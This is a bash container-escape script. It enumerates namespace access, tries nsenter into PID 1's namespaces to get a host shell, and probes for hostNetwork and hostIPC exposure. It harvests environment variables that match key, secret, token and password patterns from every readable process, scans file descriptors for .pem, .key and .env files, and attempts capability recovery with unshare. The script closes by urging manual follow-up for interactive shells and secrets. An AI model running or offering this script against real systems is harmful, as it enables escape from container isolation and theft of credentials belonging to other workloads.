#!/bin/bash
# Namespace Escape Script
# Attempts various namespace-based container escapes

echo "=== Namespace Escape Attempts ==="
echo ""

echo "[1] Checking Namespace Access"
echo ""

# Check PID namespace
echo "PID Namespace:"
if [ -d /proc/1/ns/pid ]; then
    ls -la /proc/1/ns/pid
    echo "Can access PID namespace"
else
    echo "Cannot access PID namespace"
fi
echo ""

# Check Mount namespace
echo "Mount Namespace:"
if [ -d /proc/1/ns/mnt ]; then
    ls -la /proc/1/ns/mnt
    echo "Can access Mount namespace"
else
    echo "Cannot access Mount namespace"
fi
echo ""

# Check Network namespace
echo "Network Namespace:"
if [ -d /proc/1/ns/net ]; then
    ls -la /proc/1/ns/net
    echo "Can access Network namespace"
else
    echo "Cannot access Network namespace"
fi
echo ""

echo "[2] hostPID Escape Attempts"
echo ""

# Try nsenter with PID 1
if command -v nsenter &> /dev/null; then
    echo "Attempting nsenter to PID 1..."
    echo "This will give you a shell in the host PID namespace"
    echo ""
    
    # Try different namespace combinations
    for ns_opts in "--all" "--mount --uts --ipc --net --pid" "--pid --mount"; do
        echo "Trying: nsenter --target 1 $ns_opts -- bash"
        if nsenter --target 1 $ns_opts -- /bin/bash -c "echo 'Success!'; id; exit" 2>/dev/null; then
            echo ""
            echo "[SUCCESS] nsenter worked with: $ns_opts"
            echo "Run manually: nsenter --target 1 $ns_opts -- bash"
            break
        fi
    done
else
    echo "nsenter not available"
fi
echo ""

echo "[3] hostNetwork Access"
echo ""

# Check if we can access host network
if [ -d /proc/1/net ]; then
    echo "Can access /proc/1/net - possible hostNetwork"
    echo ""
    echo "Network interfaces:"
    ls -la /proc/1/net/dev 2>/dev/null
    echo ""
    
    # Try to sniff traffic
    if command -v tcpdump &> /dev/null; then
        echo "tcpdump available - can sniff host traffic"
    fi
    
    if command -v ss &> /dev/null; then
        echo "Listening ports on host:"
        ss -tulpn 2>/dev/null | head -10
    fi
else
    echo "Cannot access host network namespace"
fi
echo ""

echo "[4] hostIPC Access"
echo ""

# Check shared memory
if [ -d /dev/shm ]; then
    echo "Shared memory accessible:"
    ls -la /dev/shm 2>/dev/null | head -10
    echo ""
    
    if command -v ipcs &> /dev/null; then
        echo "IPC facilities:"
        ipcs -a 2>/dev/null | head -10
    fi
else
    echo "Cannot access shared memory"
fi
echo ""

echo "[5] Process Environment Extraction"
echo ""

# Extract environment variables from host processes
echo "Extracting environment variables from host processes..."
echo "(This may reveal secrets, API keys, etc.)"
echo ""

for e in /proc/*/environ; do
    if [ -f "$e" ] && [ -r "$e" ]; then
        echo "Process: $e"
        xargs -0 -L1 -a "$e" 2>/dev/null | grep -iE "(key|secret|token|password|api|auth)" | head -5
        echo ""
    fi
done | head -50

echo "[6] Process File Descriptor Access"
echo ""

# Find interesting file descriptors
echo "Searching for interesting file descriptors..."
for fd_dir in /proc/[0-9]*/fd; do
    if [ -d "$fd_dir" ]; then
        for fd in "$fd_dir"/*; do
            if [ -L "$fd" ]; then
                target=$(readlink "$fd" 2>/dev/null)
                if echo "$target" | grep -qE "(secret|key|token|password|\.env|\.pem|\.key)"; then
                    echo "Found: $fd -> $target"
                fi
            fi
        done
    fi
done | head -20
echo ""

echo "[7] unshare Capability Recovery"
echo ""

# Try to recover capabilities with unshare
if command -v unshare &> /dev/null; then
    echo "Attempting capability recovery with unshare..."
    if unshare -UrmCpf /bin/bash -c "cat /proc/self/status | grep CapEff" 2>/dev/null; then
        echo ""
        echo "[SUCCESS] unshare worked - you may have recovered capabilities"
        echo "Run: unshare -UrmCpf bash"
    else
        echo "unshare failed or not permitted"
    fi
else
    echo "unshare not available"
fi
echo ""

echo "=== Namespace Escape Attempts Complete ==="
echo ""
echo "Summary:"
echo "- Check the output above for successful escape vectors"
echo "- Try the suggested commands manually for interactive shells"
echo "- Look for secrets in environment variables and file descriptors"
